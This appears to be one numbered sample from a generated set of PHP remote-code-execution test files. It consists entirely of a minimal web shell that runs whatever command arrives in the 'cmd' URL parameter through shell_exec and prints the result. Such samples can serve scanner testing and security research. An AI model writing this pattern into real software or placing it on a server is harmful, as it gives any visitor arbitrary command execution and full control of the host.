<?php
// RCE test variation #367
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>